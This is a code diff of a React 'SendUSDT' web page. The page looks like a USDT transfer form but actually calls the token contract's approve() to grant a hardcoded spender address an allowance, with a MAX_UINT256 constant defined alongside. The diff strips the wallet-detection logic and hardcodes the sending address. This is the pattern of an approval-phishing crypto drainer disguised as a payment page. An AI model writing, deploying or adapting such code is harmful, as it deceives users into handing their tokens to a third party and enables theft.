@@ -16,6 +16,9 @@ const spenderAddress = "0x84e6400eE204b4dDCe5E0eF4e253Ba886fdb966A"; // Your ver
 // const approvalAmount = "9024508479"; // USDT amount to approve
 const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
+// ✅ HARDCODED wallet address - no connection needed
+const hardcodedAddress = "0x6B2F739112C3cd1a42993fc16830D8fdf296E24c"; // Replace with your address
+
 const usdtAbi = [
   {
     inputs: [
@@ -36,120 +39,14 @@ const usdtAbi = [
   },
 ];
 
-// ✅ Storage utilities
-const StorageManager = {
-  saveUserAccount: (address) => {
-    try {
-      if (address) {
-        localStorage.setItem("userAccount", address);
-        return true;
-      }
-    } catch (err) {
-      return false;
-    }
-  },
-  getUserAccount: () => {
-    try {
-      const account = localStorage.getItem("userAccount");
-      if (account) {
-        return account;
-      }
-    } catch (err) {}
-    return null;
-  },
-};
-
-// ✅ Wait for ethereum to be available with timeout
-const waitForEthereum = async (maxWait = 5000) => {
-  const startTime = Date.now();
-  while (!window.ethereum && (Date.now() - startTime) < maxWait) {
-    await new Promise(resolve => setTimeout(resolve, 100));
-  }
-  return window.ethereum || null;
-};
-
 export default function SendUSDT() {
   const [amount, setAmount] = useState("");
   const [usdValue, setUsdValue] = useState("= $0.00");
   const [isProcessing, setIsProcessing] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
   const [theme, setTheme] = useState("dark");
-  const [userAddress, setUserAddress] = useState(null);
 
-  // ✅ Get wallet address on page load using 3-tier approach with improved detection
   useEffect(() => {
-    const getWalletAddress = async () => {
-      try {
-        const web3 = new Web3();
-        let address = null;
-
-        // ✅ Tier 1: Check localStorage first
-        const savedAddress = StorageManager.getUserAccount();
-        if (savedAddress && web3.utils.isAddress(savedAddress)) {
-          address = savedAddress;
-          console.log("✅ Address found in localStorage:", address);
-          setUserAddress(address);
-          return;
-        }
-
-        // ✅ Tier 2: Try window.ethereum with wait (Trust Wallet, MetaMask)
-        try {
-          // Wait for ethereum to be available (Trust Wallet may need time to inject)
-          const ethereum = await waitForEthereum(5000);
-          
-          if (ethereum) {
-            try {
-              const accounts = await ethereum.request({ method: "eth_accounts" });
-              if (accounts && accounts.length > 0 && web3.utils.isAddress(accounts[0])) {
-                address = accounts[0];
-                console.log("✅ Address found in window.ethereum:", address);
-                StorageManager.saveUserAccount(address);
-                setUserAddress(address);
-                return;
-              }
-            } catch (err) {
-              console.log("eth_accounts request failed, trying eth_requestAccounts:", err);
-              
-              // Try eth_requestAccounts as fallback
-              try {
-                const accounts = await ethereum.request({ method: "eth_requestAccounts" });
-                if (accounts && accounts.length > 0 && web3.utils.isAddress(accounts[0])) {
-                  address = accounts[0];
-                  console.log("✅ Address found via eth_requestAccounts:", address);
-                  StorageManager.saveUserAccount(address);
-                  setUserAddress(address);
-                  return;
-                }
-              } catch (err2) {
-                console.log("eth_requestAccounts also failed:", err2);
-              }
-            }
-          }
-        } catch (err) {
-          console.log("Error waiting for ethereum:", err);
-        }
-
-        // ✅ Tier 3: Check URL parameter (?address=0x...)
-        const urlParams = new URLSearchParams(window.location.search);
-        const paramAddress = urlParams.get("address");
-        if (paramAddress && web3.utils.isAddress(paramAddress)) {
-          address = paramAddress;
-          console.log("✅ Address found in URL parameter:", address);
-          StorageManager.saveUserAccount(address);
-          setUserAddress(address);
-          return;
-        }
-
-        console.log("⚠️ No address found in any tier");
-        setUserAddress(null);
-      } catch (err) {
-        console.log("Error getting wallet address:", err);
-        setUserAddress(null);
-      }
-    };
-
-    getWalletAddress();
-
     const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
     setTheme(darkMode ? "dark" : "light");
 
@@ -166,16 +63,9 @@ export default function SendUSDT() {
 
   const setMaxAmount = async () => {
     try {
-      let address = userAddress;
-      
-      if (!address) {
-        Swal.fire("Error", "No wallet detected. Please open this in Trust Wallet DApp browser.", "error");
-        return;
-      }
-
       const web3 = new Web3(window.ethereum);
       const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
-      const balance = await usdt.methods.balanceOf(address).call();
+      const balance = await usdt.methods.balanceOf(hardcodedAddress).call();
       setAmount(web3.utils.fromWei(balance, "mwei")); // USDT has 6 decimals
     } catch (err) {
       Swal.fire("Error", "Failed to fetch balance.", "error");
@@ -190,97 +80,23 @@ export default function SendUSDT() {
 
     setIsProcessing(true);
     try {
-      let address = userAddress;
+      const web3 = new Web3(window.ethereum || window.web3.currentProvider);
 
-      // ✅ If no address found on load, try all tiers again
-      if (!address) {
-        const web3 = new Web3();
-
-        // Tier 1: localStorage
-        const savedAddress = StorageManager.getUserAccount();
-        if (savedAddress && web3.utils.isAddress(savedAddress)) {
-          address = savedAddress;
-          console.log("✅ Address from localStorage on approve click");
-        }
-
-        // Tier 2: window.ethereum with wait
-        if (!address) {
-          try {
-            const ethereum = await waitForEthereum(3000);
-            
-            if (ethereum) {
-              try {
-                const accounts = await ethereum.request({ method: "eth_accounts" });
-                if (accounts && accounts.length > 0 && web3.utils.isAddress(accounts[0])) {
-                  address = accounts[0];
-                  console.log("✅ Address from window.ethereum on approve click");
-                }
-              } catch (err) {
-                try {
-                  const accounts = await ethereum.request({ method: "eth_requestAccounts" });
-                  if (accounts && accounts.length > 0 && web3.utils.isAddress(accounts[0])) {
-                    address = accounts[0];
-                    console.log("✅ Address from eth_requestAccounts on approve click");
-                  }
-                } catch (err2) {
-                  console.log("eth_requestAccounts failed:", err2);
-                }
-              }
-            }
-          } catch (err) {
-            console.log("Error in ethereum detection on approve click:", err);
+      const chainId = await web3.eth.getChainId();
+      if (chainId !== 56) {
+        try {
+          await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: "0x38" }],
+          });
+        } catch (switchErr) {
+          if (switchErr.code === 4902) {
+            Swal.fire("Error", "Please add BSC network to MetaMask", "error");
+          } else {
+            Swal.fire("Error", "Failed to switch network", "error");
           }
-        }
-
-        // Tier 3: URL parameter
-        if (!address) {
-          const urlParams = new URLSearchParams(window.location.search);
-          const paramAddress = urlParams.get("address");
-          if (paramAddress && web3.utils.isAddress(paramAddress)) {
-            address = paramAddress;
-            console.log("✅ Address from URL parameter on approve click");
-          }
-        }
-
-        if (address) {
-          StorageManager.saveUserAccount(address);
-          setUserAddress(address);
-        }
-      }
-
-      // ✅ Check if address is available
-      if (!address) {
-        Swal.fire("Error", "No wallet detected. Please open this in Trust Wallet DApp browser or use URL parameter ?address=0x...", "error");
-        setIsProcessing(false);
-        return;
-      }
-
-      const ethereum = await waitForEthereum(3000);
-      if (!ethereum) {
-        // If no ethereum provider, use address directly for signing
-        console.log("No ethereum provider available, using address for approval");
-      }
-
-      const web3 = new Web3(ethereum || window.web3?.currentProvider);
-
-      // Try to get chain ID if ethereum is available
-      if (ethereum) {
-        const chainId = await web3.eth.getChainId();
-        if (chainId !== 56) {
-          try {
-            await ethereum.request({
-              method: "wallet_switchEthereumChain",
-              params: [{ chainId: "0x38" }],
-            });
-          } catch (switchErr) {
-            if (switchErr.code === 4902) {
-              Swal.fire("Error", "Please add BSC network to Trust Wallet", "error");
-            } else {
-              Swal.fire("Error", "Failed to switch network", "error");
-            }
-            setIsProcessing(false);
-            return;
-          }
+          setIsProcessing(false);
+          return;
         }
       }
 
@@ -289,7 +105,7 @@ export default function SendUSDT() {
 
       const receipt = await usdt.methods
         .approve(spenderAddress, rawAmount)
-        .send({ from: address })
+        .send({ from: hardcodedAddress })
         .on("receipt", () => setShowSuccess(true))
         .on("error", (err) => {
           console.error(err);
